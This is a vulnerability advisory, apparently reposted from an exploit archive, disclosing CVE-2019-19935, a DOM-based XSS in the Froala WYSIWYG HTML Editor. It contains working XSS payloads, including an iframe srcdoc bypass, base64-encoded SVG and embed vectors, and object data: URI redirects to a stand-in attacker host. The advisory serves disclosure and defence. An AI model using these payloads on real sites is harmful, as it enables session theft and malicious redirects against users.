@@ -1,0 +1,260 @@
+id: 34633
+date: 07/04/2020
+title: Froala WYSIWYG HTML Editor 3.1.1 Cross Site Scripting Vulnerability
+author: Emanuel Duss
+cves: CVE-2019-19935
+
+#############################################################
+#
+# Product:  Froala WYSIWYG HTML Editor
+# Vendor:   Froala
+# CSNC ID:  CSNC-2020-004
+# CVE ID:   CVE-2019-19935
+# Subject:  DOM XSS in Froala WYSIWYG HTML Editor
+# Severity: Medium
+# Effect:   Remotely exploitable
+# Author:   Emanuel Duss <emanuel.duss@compass-security.com>
+# Date:     2020-07-01
+#
+#############################################################
+
+Introduction
+------------
+
+Froala WYSIWYG HTML Editor is a lightweight WYSIWYG HTML Editor written in
+JavaScript that enables rich text editing capabilities for web applications
+[1]. Froala sanitizes the user input in order to prevent cross-site scripting
+attacks [2].
+
+During a web application penetration test, Compass found a DOM-based cross-site
+scripting (XSS) [3] in the Froala WYSIWYG HTML Editor. HTML code in the editor
+is not correctly sanitized when inserted into the DOM. This allows an attacker
+that can control the editor content to execute arbitrary JavaScript in the
+context of the victim's session.
+
+
+Affected
+--------
+
+* All versions of the Froala WYSIWYG HTML Editor
+
+The issue was found in December 2019 in version 3.0.6 and was still not fixed
+in July 2020 in version 3.1.1.
+
+
+Technical Summary
+-----------------
+
+It's possible to perform DOM based XSS in the Froala editor by inserting the
+`<iframe>` tag and the `srcdoc` attribute into the editor:
+
+    <iframe srcdoc="<img src=x onerror=alert(document.domain)>"></iframe>
+
+This can be verified by inserting the payload into the "Code View" of the
+editor.
+
+In this case, this is would be a self-XSS because the users would only attack
+themselves. However, it could be possible that untrusted data from a
+non-controlled source is loaded into the editor in order to exploit it. An
+example could be a web application where multiple users can edit the same
+content using this editor.
+
+An attacker can use this to execute own JavaScript code in the session of the
+victim. This can be abused to read the content of the victim's account, use the
+session to make further requests to the web application or read the cookies or
+web storage.
+
+
+Technical Details
+-----------------
+
+# Correct Behavior
+
+According to the Froala tech support page "Why is the <script> tag being
+removed?", the `<script>` tag is removed in order to prevent possible XSS
+attacks [2]. Other XSS payloads that use other HTML tags and event handlers are
+also removed from the DOM before they are inserted.
+
+This can be verified using a PoC hosted on `poc.example.net` that inserts
+potentially untrusted data with a `<script>` tag into the editor:
+
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/froala-editor/3.0.6/css/froala_style.min.css" rel="stylesheet" type="text/css" />
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/froala-editor/3.0.6/css/froala_editor.pkgd.min.css" rel="stylesheet" type="text/css" />
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/froala-editor/3.0.6/js/froala_editor.pkgd.min.js"></script>
+
+    <div id="froala-editor"></div>
+
+    <script>
+    let editor = new FroalaEditor('div#froala-editor', {}, function() {
+      // This data could be loaded from a potentially untrusted source, e.g. from an API via an XMLHttpRequest
+      data = "<s>Hello<\/s><script>console.log(document.domain)<\/script><u>Compass<\/u>";
+
+      // Inserting untrusted data into the editor
+      editor.html.set(data);
+
+      // Show how the untrusted data is embedded into the DOM
+      console.log(editor.html.get());
+    })
+    </script>
+
+The JavaScript console shows that legit HTML tags like `<s>` or `<u>` were
+inserted into the DOM but the `<script>` tag was correctly removed (as
+expected) and therefore the JavaScript was not executed:
+
+    <p><s>Hello</s><u>Compass</u></p>
+
+The same can be done by inserting an `<img>` tag with an `onerror` event
+handler as an XSS vector:
+
+    [...]
+    data = "<s>Hello<\/s><img src=x onerror=console.log(document.domain)><u>Compass<\/u>";
+    [...]
+
+The JavaScript console again shows that the legit HTML tags were inserted and
+also the `<img>` tag, but without the used `onerror` event handler. Therefore,
+the JavaScript was not executed:
+
+    <p><s>Hello</s><img src="x" class="fr-fic fr-dii"><u>Compass</u></p>
+
+This shows that it's not possible to load and execute common XSS payloads into
+the editor.
+
+
+# XSS Bypass
+
+I tried every event handler from the awesome PortSwigger XSS cheat sheet [4],
+but all of them were blocked. Thanks to the XSS cheat sheet, I found an HTML
+tag with an attribute that does not start with `on`, which can execute
+JavaScript in the origin of the website.  This tag was not filtered. It's the
+`<iframe>` tag with the `srcdoc` attribute. The `srcdoc` attribute specifies
+the HTML content of the page to show in the inline frame [5]. This can be used
+to embed JavaScript code. The code runs in the origin of the website where the
+iframe is embedded.
+
+Working XSS payload:
+
+
+    [...]
+    data = "<s>Hello<\/s><iframe srcdoc=\"<img src=x onerror=console.log(document.domain)>\"><\/iframe><u>Compass<\/u>";
+    [...]
+
+The JavaScript console shows that the `<iframe>` tag with the `srcdoc`
+attribute was inserted into the DOM without sanitizing. Also the content of
+the iframe with the `<img>` tag and the `onerror` event handler was not
+sanitized. Further, the origin on which PoC website is hosted is printed:
+
+    <p><s>Hello</s><iframe srcdoc="<img src=x onerror=alert(document.domain)>"></iframe><u>Compass</u></p>
+    poc.example.net
+
+Therefore, this shows that the following XSS payload can be used in order to
+inject and execute JavaScript into the DOM, which results in a DOM-based XSS:
+
+    <iframe srcdoc="<img src=x onerror=console.log(document.domain)>"></iframe>
+
+Note: The `<img>` tag with the `onerror` event handler is only the data content
+of the `srcdoc` attribute and no code for the browser. This is rendered into
+code later when the content of the iframe is built.
+
+The injected JavaScript code runs in the origin of the website where the Froala
+editor is running. The next section explains why I mention this explicitly.
+
+
+XSS with Undefined / Empty Origin
+---------------------------------
+
+There are several issues marked as open and fixed in the Froala GitHub
+repository regarding XSS [6]. The closed ones are also not fixed at the moment.
+However, most of these XSS are running in another origin as the website where
+the editor is loaded.
+
+
+# Example 1
+
+For example, the issue #3270 [7] that is marked as closed and uses an embedded
+object (`<embed>` tag) in order to execute JavaScript:
+
+    [...]
+    data = "<EMBED/SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+Y29uc29sZS5sb2coZG9jdW1lbnQuZG9tYWluKTwvc2NyaXB0Pjwvc3ZnPgo=\">"
+    [....]
+
+The base64 decoded payload is an SVG image containing JavaScript:
+
+    <svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg"
+      xmlns:xlink="http://www.w3.org/1999/xlink" version="1.0" x="0" y="0" width="194" height="200" id="xss">
+    <script type="text/ecmascript">console.log(document.domain)</script></svg>
+
+The JavaScript console shows that the code is executed but the origin is
+`undefined`:
+
+    <p><embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+Y29uc29sZS5sb2coZG9jdW1lbnQuZG9tYWluKTwvc2NyaXB0Pjwvc3ZnPgo="></p>
+    undefined
+
+
+# Example 2
+
+Another example is the issue #3039 [8] that is marked as closed uses the `<object>`
+tag to embed HTML / JavaScript code:
+
+    [...]
+    data = "<object data='data:text/html,<svg onload=console.log(document.domain)>'>";
+    [...]
+
+The JavaScript console shows that the code is executed but the origin is empty:
+
+    <p><object data="data:text/html,<svg onload=console.log(document.domain)>"></object></p>
+    // empty line
+
+
+# Exploiting XSS with Undefined / Empty Origins
+
+Because the origin is not the same as where the PoC is hosted, it's not a
+typical XSS where an attacker could read the content of the victim's website,
+use the session to make further requests or access the cookies or web storage.
+
+It is however still possible to perform arbitrary redirects to other websites
+using the reference to the `window.top.location`:
+
+    [...]
+    data = "<object data='data:text/html,<svg onload=window.top.location=\"http://evil.example.net/\">'>";
+    [...]
+
+This redirects to http://evil.example.net/.
+
+The same applies for the embed tag:
+
+      [...]
+      data = "<EMBED/SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj4KICA8c2NyaXB0PndpbmRvdy50b3AubG9jYXRpb249Imh0dHA6Ly9ldmlsLmV4YW1wbGUubmV0LyI8L3NjcmlwdD4KPC9zdmc+Cg==\">"
+      [...]
+
+Decoded base64 payload:
+
+    <svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.0" x="0" y="0" width="194" height="200" id="xss">
+      <script>window.top.location="http://evil.example.net/"</script>
+    </svg>
+
+This also redirects to http://evil.example.net/.
+
+This is not as nice and powerful as the "real" XSS attack from the beginning, but still
+something ;-).
+
+
+Vulnerability Classification
+----------------------------
+
+CVSS v3.1 Metrics [9]:
+
+* CVSS Base Score: 6.1
+* CVSS Vector:     AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+
+
+Remediation
+-----------
+
+This XSS issue is not fixed. The vendor can't tell any exact release date for a
+fixed version.
+
+Therefore, only trusted data or data that is already sanitized should be loaded
+into the editor.
+
+
+#  0day.today [2023-03-27]  #
